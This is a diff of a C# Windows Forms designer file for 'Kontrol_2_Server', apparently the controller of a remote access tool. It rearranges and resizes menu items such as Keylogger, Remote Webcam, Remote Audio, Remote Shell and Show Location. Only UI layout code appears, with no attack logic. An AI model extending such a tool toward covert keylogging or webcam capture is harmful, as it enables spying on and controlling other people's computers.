@@ -52,12 +52,16 @@ namespace Kontrol_2_Server
 			this.microsoftTextToSpeechToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.playSinewaveFrequencyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.hideWindowsElementsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+			this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+			this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+			this.changeWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.monitoringToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.proccessManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.fileManagerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.remoteDesktopToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.remoteWebcamToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.remoteAudioToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+			this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.miscToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.remoteShellToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.manageClientToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
@@ -69,6 +73,7 @@ namespace Kontrol_2_Server
 			this.showLocationToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.advancedToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.sendCommandToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
+			this.compileCScriptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.iconsList = new System.Windows.Forms.ImageList(this.components);
 			this.tabPage2 = new System.Windows.Forms.TabPage();
 			this.tabPage3 = new System.Windows.Forms.TabPage();
@@ -85,11 +90,6 @@ namespace Kontrol_2_Server
 			this.notifyStrip = new System.Windows.Forms.ContextMenuStrip(this.components);
 			this.showToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.exitToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-			this.compileCScriptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-			this.keyloggerToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-			this.visitWebsiteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-			this.chatToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
-			this.changeWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
 			this.mainTab.SuspendLayout();
 			this.tabPage1.SuspendLayout();
 			this.listViewStrip.SuspendLayout();
@@ -277,6 +277,28 @@ namespace Kontrol_2_Server
 			this.hideWindowsElementsToolStripMenuItem.Text = "Hide Windows Elements";
 			this.hideWindowsElementsToolStripMenuItem.Click += new System.EventHandler(this.hideWindowsElementsToolStripMenuItem_Click);
 			// 
+			// visitWebsiteToolStripMenuItem
+			// 
+			this.visitWebsiteToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_25;
+			this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
+			this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
+			this.visitWebsiteToolStripMenuItem.Text = "Visit Website";
+			// 
+			// chatToolStripMenuItem
+			// 
+			this.chatToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_10101;
+			this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
+			this.chatToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
+			this.chatToolStripMenuItem.Text = "Chat";
+			this.chatToolStripMenuItem.Click += new System.EventHandler(this.chatToolStripMenuItem_Click);
+			// 
+			// changeWallpaperToolStripMenuItem
+			// 
+			this.changeWallpaperToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_21;
+			this.changeWallpaperToolStripMenuItem.Name = "changeWallpaperToolStripMenuItem";
+			this.changeWallpaperToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
+			this.changeWallpaperToolStripMenuItem.Text = "Change Wallpaper";
+			// 
 			// monitoringToolStripMenuItem
 			// 
 			this.monitoringToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
@@ -295,7 +317,7 @@ namespace Kontrol_2_Server
 			// 
 			this.proccessManagerToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.shell32_321;
 			this.proccessManagerToolStripMenuItem.Name = "proccessManagerToolStripMenuItem";
-			this.proccessManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.proccessManagerToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
 			this.proccessManagerToolStripMenuItem.Text = "Process Manager";
 			this.proccessManagerToolStripMenuItem.Click += new System.EventHandler(this.proccessManagerToolStripMenuItem_Click);
 			// 
@@ -303,7 +325,7 @@ namespace Kontrol_2_Server
 			// 
 			this.fileManagerToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_1023;
 			this.fileManagerToolStripMenuItem.Name = "fileManagerToolStripMenuItem";
-			this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.fileManagerToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
 			this.fileManagerToolStripMenuItem.Text = "File Manager";
 			this.fileManagerToolStripMenuItem.Click += new System.EventHandler(this.fileManagerToolStripMenuItem_Click);
 			// 
@@ -311,7 +333,7 @@ namespace Kontrol_2_Server
 			// 
 			this.remoteDesktopToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_110;
 			this.remoteDesktopToolStripMenuItem.Name = "remoteDesktopToolStripMenuItem";
-			this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.remoteDesktopToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
 			this.remoteDesktopToolStripMenuItem.Text = "Remote Desktop";
 			this.remoteDesktopToolStripMenuItem.Click += new System.EventHandler(this.remoteDesktopToolStripMenuItem_Click);
 			// 
@@ -319,7 +341,7 @@ namespace Kontrol_2_Server
 			// 
 			this.remoteWebcamToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_57;
 			this.remoteWebcamToolStripMenuItem.Name = "remoteWebcamToolStripMenuItem";
-			this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.remoteWebcamToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
 			this.remoteWebcamToolStripMenuItem.Text = "Remote Webcam";
 			this.remoteWebcamToolStripMenuItem.Click += new System.EventHandler(this.remoteWebcamToolStripMenuItem_Click);
 			// 
@@ -327,9 +349,16 @@ namespace Kontrol_2_Server
 			// 
 			this.remoteAudioToolStripMenuItem.Image = ((System.Drawing.Image)(resources.GetObject("remoteAudioToolStripMenuItem.Image")));
 			this.remoteAudioToolStripMenuItem.Name = "remoteAudioToolStripMenuItem";
-			this.remoteAudioToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.remoteAudioToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
 			this.remoteAudioToolStripMenuItem.Text = "Remote Audio";
 			this.remoteAudioToolStripMenuItem.Click += new System.EventHandler(this.remoteAudioToolStripMenuItem_Click);
+			// 
+			// keyloggerToolStripMenuItem
+			// 
+			this.keyloggerToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_5360;
+			this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
+			this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(165, 22);
+			this.keyloggerToolStripMenuItem.Text = "Keylogger";
 			// 
 			// miscToolStripMenuItem
 			// 
@@ -344,7 +373,7 @@ namespace Kontrol_2_Server
 			// 
 			this.remoteShellToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_5323;
 			this.remoteShellToolStripMenuItem.Name = "remoteShellToolStripMenuItem";
-			this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.remoteShellToolStripMenuItem.Size = new System.Drawing.Size(143, 22);
 			this.remoteShellToolStripMenuItem.Text = "Remote Shell";
 			this.remoteShellToolStripMenuItem.Click += new System.EventHandler(this.remoteShellToolStripMenuItem_Click);
 			// 
@@ -366,7 +395,7 @@ namespace Kontrol_2_Server
 			// 
 			this.exitToolStripMenuItem1.Image = global::Kontrol_2_Server.Properties.Resources.imageres_1027;
 			this.exitToolStripMenuItem1.Name = "exitToolStripMenuItem1";
-			this.exitToolStripMenuItem1.Size = new System.Drawing.Size(180, 22);
+			this.exitToolStripMenuItem1.Size = new System.Drawing.Size(152, 22);
 			this.exitToolStripMenuItem1.Text = "Exit";
 			this.exitToolStripMenuItem1.Click += new System.EventHandler(this.exitToolStripMenuItem1_Click);
 			// 
@@ -374,7 +403,7 @@ namespace Kontrol_2_Server
 			// 
 			this.shutdownToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_1008;
 			this.shutdownToolStripMenuItem.Name = "shutdownToolStripMenuItem";
-			this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.shutdownToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
 			this.shutdownToolStripMenuItem.Text = "Shutdown";
 			this.shutdownToolStripMenuItem.Click += new System.EventHandler(this.shutdownToolStripMenuItem_Click);
 			// 
@@ -382,7 +411,7 @@ namespace Kontrol_2_Server
 			// 
 			this.sleepToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_10081;
 			this.sleepToolStripMenuItem.Name = "sleepToolStripMenuItem";
-			this.sleepToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.sleepToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
 			this.sleepToolStripMenuItem.Text = "Sleep";
 			this.sleepToolStripMenuItem.Click += new System.EventHandler(this.sleepToolStripMenuItem_Click);
 			// 
@@ -390,7 +419,7 @@ namespace Kontrol_2_Server
 			// 
 			this.restartToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_5311;
 			this.restartToolStripMenuItem.Name = "restartToolStripMenuItem";
-			this.restartToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.restartToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
 			this.restartToolStripMenuItem.Text = "Restart";
 			this.restartToolStripMenuItem.Click += new System.EventHandler(this.restartToolStripMenuItem_Click);
 			// 
@@ -398,7 +427,7 @@ namespace Kontrol_2_Server
 			// 
 			this.uninstallToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_54;
 			this.uninstallToolStripMenuItem.Name = "uninstallToolStripMenuItem";
-			this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.uninstallToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
 			this.uninstallToolStripMenuItem.Text = "Uninstall";
 			this.uninstallToolStripMenuItem.Click += new System.EventHandler(this.uninstallToolStripMenuItem_Click);
 			// 
@@ -406,7 +435,7 @@ namespace Kontrol_2_Server
 			// 
 			this.showLocationToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_18;
 			this.showLocationToolStripMenuItem.Name = "showLocationToolStripMenuItem";
-			this.showLocationToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.showLocationToolStripMenuItem.Size = new System.Drawing.Size(152, 22);
 			this.showLocationToolStripMenuItem.Text = "Show Location";
 			this.showLocationToolStripMenuItem.Click += new System.EventHandler(this.showLocationToolStripMenuItem_Click);
 			// 
@@ -422,10 +451,19 @@ namespace Kontrol_2_Server
 			// 
 			// sendCommandToolStripMenuItem
 			// 
+			this.sendCommandToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_53241;
 			this.sendCommandToolStripMenuItem.Name = "sendCommandToolStripMenuItem";
 			this.sendCommandToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
 			this.sendCommandToolStripMenuItem.Text = "Send Command";
 			this.sendCommandToolStripMenuItem.Click += new System.EventHandler(this.sendCommandToolStripMenuItem_Click);
+			// 
+			// compileCScriptToolStripMenuItem
+			// 
+			this.compileCScriptToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.shell32_153;
+			this.compileCScriptToolStripMenuItem.Name = "compileCScriptToolStripMenuItem";
+			this.compileCScriptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
+			this.compileCScriptToolStripMenuItem.Text = "Compile C# Script";
+			this.compileCScriptToolStripMenuItem.Click += new System.EventHandler(this.compileCScriptToolStripMenuItem_Click);
 			// 
 			// iconsList
 			// 
@@ -554,40 +592,6 @@ namespace Kontrol_2_Server
 			this.exitToolStripMenuItem.Size = new System.Drawing.Size(103, 22);
 			this.exitToolStripMenuItem.Text = "Exit";
 			this.exitToolStripMenuItem.Click += new System.EventHandler(this.exitToolStripMenuItem_Click);
-			// 
-			// compileCScriptToolStripMenuItem
-			// 
-			this.compileCScriptToolStripMenuItem.Name = "compileCScriptToolStripMenuItem";
-			this.compileCScriptToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-			this.compileCScriptToolStripMenuItem.Text = "Compile C# Script";
-			// 
-			// keyloggerToolStripMenuItem
-			// 
-			this.keyloggerToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_5360;
-			this.keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
-			this.keyloggerToolStripMenuItem.Size = new System.Drawing.Size(180, 22);
-			this.keyloggerToolStripMenuItem.Text = "Keylogger";
-			// 
-			// visitWebsiteToolStripMenuItem
-			// 
-			this.visitWebsiteToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_25;
-			this.visitWebsiteToolStripMenuItem.Name = "visitWebsiteToolStripMenuItem";
-			this.visitWebsiteToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
-			this.visitWebsiteToolStripMenuItem.Text = "Visit Website";
-			// 
-			// chatToolStripMenuItem
-			// 
-			this.chatToolStripMenuItem.Image = global::Kontrol_2_Server.Properties.Resources.imageres_10101;
-			this.chatToolStripMenuItem.Name = "chatToolStripMenuItem";
-			this.chatToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
-			this.chatToolStripMenuItem.Text = "Chat";
-			this.chatToolStripMenuItem.Click += new System.EventHandler(this.chatToolStripMenuItem_Click);
-			// 
-			// changeWallpaperToolStripMenuItem
-			// 
-			this.changeWallpaperToolStripMenuItem.Name = "changeWallpaperToolStripMenuItem";
-			this.changeWallpaperToolStripMenuItem.Size = new System.Drawing.Size(206, 22);
-			this.changeWallpaperToolStripMenuItem.Text = "Change Wallpaper";
 			// 
 			// MainForm
 			// 
